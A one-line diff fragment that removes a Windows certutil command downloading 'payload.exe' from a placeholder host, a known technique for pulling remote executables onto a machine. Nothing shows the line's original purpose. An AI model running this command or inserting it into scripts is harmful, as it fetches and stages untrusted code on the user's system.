@@ -1,1 +1,0 @@
-certutil.exe -urlcache -f http://example.com/payload.exe payload.exe
